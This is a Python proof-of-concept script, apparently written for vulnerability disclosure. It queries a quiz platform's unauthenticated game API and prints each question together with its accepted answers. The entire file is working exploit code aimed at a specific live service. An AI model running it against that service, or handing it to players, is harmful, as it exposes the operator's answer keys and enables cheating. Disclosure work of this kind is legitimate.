#!/usr/bin/env python3
"""Dump a Sherlock Quiz game's questions and correct answers.

Proof of concept for disclosure: the public, unauthenticated endpoint
GET https://play-server.sherlockquiz.com/api/game/{gid} returns the whole
slide deck, including an `answers` field holding the accepted answers for
every question. The player web app downloads it when a team joins.

Usage:
    python3 leak.py 'https://play.sherlockquiz.com/?gid=4577&tid=2224'
    python3 leak.py 4577
"""

import html
import json
import re
import sys
import urllib.parse
import urllib.request

API = "https://play-server.sherlockquiz.com/api"

SLIDE_TYPES = {2: "text", 3: "image", 4: "audio", 5: "video"}


def parse_gid(arg):
    """Accept either a bare game id or a play.sherlockquiz.com URL."""
    if arg.isdigit():
        retval = arg
    else:
        query = urllib.parse.parse_qs(urllib.parse.urlparse(arg).query)
        if "gid" not in query:
            raise SystemExit("no gid in URL: %s" % arg)
        retval = query["gid"][0]
    return retval


def fetch_game(gid):
    req = urllib.request.Request(
        "%s/game/%s" % (API, gid),
        headers={"User-Agent": "Mozilla/5.0"},
    )
    with urllib.request.urlopen(req, timeout=30) as resp:
        retval = json.load(resp)
    return retval


def clean(text):
    retval = re.sub(r"\s+", " ", html.unescape(re.sub(r"<[^>]+>", " ", text or ""))).strip()
    return retval


def render(game):
    info = game["game"]
    lines = [
        "# %s (gid %s, %s %s)" % (info["name"], info["id"], info["date"][:10], info.get("time", "")),
        "",
    ]
    questions = [s for s in game["slider"] if s.get("answer") == 1]
    tour = None
    for slide in questions:
        if slide["tour"] != tour:
            tour = slide["tour"]
            lines += ["", "## Tour %s" % tour, ""]
        kind = SLIDE_TYPES.get(slide["type"], str(slide["type"]))
        media = slide.get("image") or slide.get("audio_file") or slide.get("video_file") or ""
        answers = sorted(set(a for a in slide.get("answers") or [] if a))
        lines.append(
            "%s. [%s, %ss%s] %s" % (
                slide.get("number", "?"),
                kind,
                slide["timeout"],
                ", " + media if media else "",
                clean(slide.get("question")),
            )
        )
        lines.append("   -> %s" % " | ".join(answers))
    lines += ["", "%d questions, %d with answers" % (
        len(questions), sum(1 for s in questions if s.get("answers")))]
    retval = "\n".join(lines)
    return retval


def main():
    if len(sys.argv) != 2:
        raise SystemExit(__doc__)
    print(render(fetch_game(parse_gid(sys.argv[1]))))


if __name__ == "__main__":
    main()
